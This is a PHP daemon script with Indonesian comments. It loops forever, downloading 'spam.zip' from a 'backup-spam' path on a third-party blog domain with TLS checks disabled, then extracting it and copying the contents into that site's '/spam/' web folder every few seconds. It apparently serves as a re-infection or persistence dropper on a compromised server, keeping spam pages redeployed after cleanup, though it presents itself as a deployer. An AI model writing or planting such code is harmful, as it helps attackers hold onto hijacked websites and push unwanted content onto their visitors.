<?php
/* ========= LOG KE FILE (WAJIB) ========= */
$LOG_FILE = '/home/liaisong/tmp/live_deploy_liaisongroup.log';
function logmsg($m){ global $LOG_FILE; @file_put_contents($LOG_FILE,"[".date('Y-m-d H:i:s')."] $m\n",FILE_APPEND); }

/* ========= LOCK ========= */
$lockPath = '/home/liaisong/tmp/deploy_liaisongroup.lock';
$lock = fopen($lockPath,'c');
if (!$lock || !flock($lock, LOCK_EX|LOCK_NB)) { logmsg("LOCKED: $lockPath kepegang, exit"); exit; }

/* ========= CONFIG ========= */
$PACKAGE_URL = "https://blog.agsainmobiliaria.com/backup-spam/spam.zip";   // ganti ke ZIP kamu
$TARGET_DIR = rtrim("/www/wwwroot/blog.agsainmobiliaria.com/spam/", "/"); // target dir yang mau dibackup
$BACKUP_KEEP = 5;
$SLEEP_SEC   = 3;
$DEFAULT_DIR_PERMISSIONS  = 0755;
$DEFAULT_FILE_PERMISSIONS = 0644;

logmsg("START daemon. target=$TARGET_DIR");

/* ========= HELPERS ========= */
function ensure_dir($p,$perm=0755){ if(!is_dir($p)){ if(!@mkdir($p,$perm,true)){ logmsg("mkdir fail: $p"); return false; } } @chmod($p,$perm); return true; }

function curl_download_to($url, $dest, $timeout=300){
  logmsg("DOWNLOAD begin url=$url");

  $maxRetry = 6;
  for ($try=1; $try<=$maxRetry; $try++) {

    // kalau ada sisa file lama, lanjutkan (resume)
    $written = (is_file($dest)) ? filesize($dest) : 0;
    $fp = @fopen($dest, $written ? 'ab' : 'wb');
    if(!$fp){ logmsg("WRITE OPEN FAIL: $dest"); return false; }

    $ch = curl_init($url);
    $headers = [];
    if ($written > 0) {
      $headers[] = "Range: bytes={$written}-";
    }

    curl_setopt_array($ch, [
      CURLOPT_FILE            => $fp,               // stream langsung ke file
      CURLOPT_FOLLOWLOCATION  => true,
      CURLOPT_CONNECTTIMEOUT  => 30,
      CURLOPT_TIMEOUT         => $timeout,          // total timeout (detik)
      CURLOPT_USERAGENT       => 'curl/deployer',
      CURLOPT_SSL_VERIFYPEER  => false,
      CURLOPT_SSL_VERIFYHOST  => 0,
      CURLOPT_HEADER          => false,
      CURLOPT_HTTPHEADER      => $headers,
      CURLOPT_IPRESOLVE       => CURL_IPRESOLVE_V4,
      // kalau koneksi lambat banget, anggap gagal dan retry
      CURLOPT_LOW_SPEED_TIME  => 20,
      CURLOPT_LOW_SPEED_LIMIT => 10240,             // 10 KB/s
      // keepalive
      CURLOPT_TCP_KEEPALIVE   => 1,
      CURLOPT_TCP_KEEPIDLE    => 30,
      CURLOPT_TCP_KEEPINTVL   => 15,
    ]);

    $ok   = curl_exec($ch);
    $err  = curl_error($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $ctype= strtolower((string)curl_getinfo($ch, CURLINFO_CONTENT_TYPE));
    curl_close($ch);
    fclose($fp);

    // selesai kalau HTTP 200/206 dan ukuran sudah sesuai (ZIP magic di awal file)
    clearstatcache(true, $dest);
    $size = @filesize($dest);

    if ($ok && ($code==200 || $code==206)) {
      // cek signature ZIP di awal file
      $fh=@fopen($dest,'rb');
      $sig=$fh? bin2hex(fread($fh,4)) : '';
      if($fh) fclose($fh);

      if ($sig==='504b0304') {
        logmsg("DOWNLOAD OK code=$code size=$size ctype=$ctype sig=$sig -> $dest");
        return true;
      } else {
        logmsg("BAD SIG (sig=$sig) size=$size, retry...");
      }
    } else {
      logmsg("TRY#$try FAIL code=$code err=$err size=$size");
    }

    // tunggu dikit lalu ulang
    sleep(min(3*$try, 10));
  }

  logmsg("DOWNLOAD FAILED after $maxRetry tries");
  return false;
}

function rrmdir($dir){
  if(!is_dir($dir)) return;
  $it=new RecursiveDirectoryIterator($dir,FilesystemIterator::SKIP_DOTS);
  $ri=new RecursiveIteratorIterator($it,RecursiveIteratorIterator::CHILD_FIRST);
  foreach($ri as $f){ $f->isDir()?@rmdir($f):@unlink($f); }
  @rmdir($dir);
}

function rchmod($path,$d=0755,$f=0644){
  if(is_dir($path)){
    $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path,FilesystemIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);
    foreach($it as $p){ @chmod($p->getPathname(), $p->isDir()?$d:$f); }
    @chmod($path,$d);
  } elseif(is_file($path)){ @chmod($path,$f); }
}

function detect_archive_type($file){
  $fh=@fopen($file,'rb'); if(!$fh) return null;
  $sig=fread($fh,8); fclose($fh);
  if(strncmp($sig,"\x50\x4B\x03\x04",4)===0) return 'zip';
  if(strncmp($sig,"\x1F\x8B",2)===0)       return 'tgz';
  return 'unknown';
}

function extract_zip_safe($zipFile,$destDir){
  if(!class_exists('ZipArchive')) return false;
  $zip=new ZipArchive();
  if($zip->open($zipFile)!==true){ return false; }
  for($i=0;$i<$zip->numFiles;$i++){
    $name=$zip->getNameIndex($i);
    $name=str_replace(['..\\','../'],'',$name);
    if($name==='') continue;
    $target=$destDir.'/'.$name;
    if(substr($name,-1)==='/'){ if(!is_dir($target)&&!@mkdir($target,0755,true)){ $zip->close(); return false; } }
    else{
      $dir=dirname($target); if(!is_dir($dir)&&!@mkdir($dir,0755,true)){ $zip->close(); return false; }
      $fp=$zip->getStream($name); if(!$fp){ $zip->close(); return false; }
      $out=@fopen($target,'wb'); if(!$out){ fclose($fp); $zip->close(); return false; }
      while(!feof($fp)){ fwrite($out,fread($fp,8192)); }
      fclose($out); fclose($fp);
    }
  }
  $zip->close(); return true;
}

function extract_with_unzip_cli($zipFile,$destDir){
  $bin=trim(shell_exec('which unzip 2>/dev/null'));
  if($bin==='') return false;
  $cmd=sprintf('%s -oq %s -d %s 2>&1',$bin,escapeshellarg($zipFile),escapeshellarg($destDir));
  exec($cmd,$out,$code);
  if($code!==0) logmsg("unzip CLI fail: ".implode(" | ",$out));
  return $code===0;
}

function validate_zip_cli($zipFile){
  $bin = trim(shell_exec('which unzip 2>/dev/null'));
  if($bin==='') return true; // kalau ga ada unzip, skip validasi
  exec(sprintf('%s -t %s 2>&1', $bin, escapeshellarg($zipFile)), $out, $rc);
  if($rc!==0){ logmsg('ZIP test fail: '.implode(' | ', $out)); }
  return $rc===0;
}


// --- copy helper (tanpa rename) ---
function copy_dir($src,$dst){
  $it=new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS),
    RecursiveIteratorIterator::SELF_FIRST
  );
  foreach($it as $f){
    $to = $dst . '/' . $it->getSubPathName();
    if ($f->isDir()) {
      if (!is_dir($to)) @mkdir($to, 0755, true);
    } else {
      @mkdir(dirname($to), 0755, true);
      @copy($f->getPathname(), $to);
    }
  }
  return true;
}

// --- backup rotate pakai copy (NO rename) ---
function backup_rotate_copy($targetDir, $keep=5){
  if (!is_dir($targetDir)) return;
  $backupRoot = dirname($targetDir).'/.backups';
  if (!is_dir($backupRoot)) @mkdir($backupRoot, 0755, true);
  $stamp = date('Ymd-His');
  $dst   = $backupRoot . '/' . basename($targetDir) . '-' . $stamp;
  @mkdir($dst, 0755, true);
  copy_dir($targetDir, $dst);
  // rotasi
  $list = glob($backupRoot . '/' . basename($targetDir) . '-*');
  rsort($list);
  for ($i=$keep; $i<count($list); $i++) { rrmdir($list[$i]); }
}

// --- deploy copy-only (NO rename) ---
function deploy_copy_only($srcDir, $targetDir){
  // backup dulu biar aman
  if (is_dir($targetDir)) backup_rotate_copy($targetDir, $GLOBALS['BACKUP_KEEP']);
  // JANGAN rrmdir($targetDir)
  if (!is_dir($targetDir)) @mkdir($targetDir, 0755, true);
  return copy_dir($srcDir, $targetDir); // overwrite file yg sama, file lain aman
}


/* ========= MAIN LOOP ========= */
while(true){
  $work=sys_get_temp_dir().'/deploy_work_'.uniqid();
  $zip =sys_get_temp_dir().'/package_'.uniqid().'.bin';
  logmsg("LOOP start work=$work zip=$zip");

  if(!ensure_dir($work,0755)){ logmsg("ensure_dir fail"); sleep($SLEEP_SEC); continue; }

  if(!curl_download_to($PACKAGE_URL,$zip)){ rrmdir($work); @unlink($zip); sleep($SLEEP_SEC); continue; }

  if (!validate_zip_cli($zip)) { rrmdir($work); @unlink($zip); sleep($SLEEP_SEC); continue; }

  $type=detect_archive_type($zip);
  logmsg("ARCHIVE type=$type");
  $ok=false;
  if($type==='zip' || $type==='unknown'){ $ok=extract_zip_safe($zip,$work) ?: extract_with_unzip_cli($zip,$work); }
  elseif($type==='tgz' && class_exists('PharData')){
    try{ $tarGz=new PharData($zip); $tmp=$zip.'.tar'; $tarGz->decompress(); $tar=new PharData($tmp); $tar->extractTo($work,null,true); @unlink($tmp); $ok=true; }
    catch(Exception $e){ $ok=false; }
  }

// ... abis bagian hitung $ok ...

if ($ok) {
    rchmod($work,$DEFAULT_DIR_PERMISSIONS,$DEFAULT_FILE_PERMISSIONS);

    if (deploy_copy_only($work,$TARGET_DIR)) {
        logmsg("SUCCESS deploy(copy) -> $TARGET_DIR");
    } else {
        logmsg("ERROR deploy(copy) failed");
    }

    rrmdir($work);
    @unlink($zip);
} else {
    logmsg("ERROR extract failed (type=$type)");
    rrmdir($work);
    @unlink($zip);
}

sleep($SLEEP_SEC);

}